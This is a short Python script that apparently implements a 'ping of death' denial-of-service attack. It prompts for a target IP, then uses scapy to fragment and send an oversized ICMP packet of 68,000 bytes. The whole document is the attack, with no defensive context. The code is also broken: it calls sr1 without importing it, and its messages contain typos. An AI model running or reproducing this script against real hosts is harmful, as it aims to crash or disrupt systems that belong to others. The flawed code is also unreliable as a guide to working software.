from scapy.all import ICMP,fragment,IP,send
import sys

target=input('Enter the IP address of target')
ping=IP(dst=target)/ICMP()
ans=sr1(ping,timeout=5,verbose=False)

if ans==None:
	print('Target is not reachable!')
	sys.exit()

def pingofdeath(target):
	try:
		for p in fragment(IP(dst=target)/ICMP()/('x'*68000)):
			send(p)
		print('Packet sent successfully')
	except Exception as e:
		print('An error occured during sending th packet')
		print(e)


pingofdeath(target)
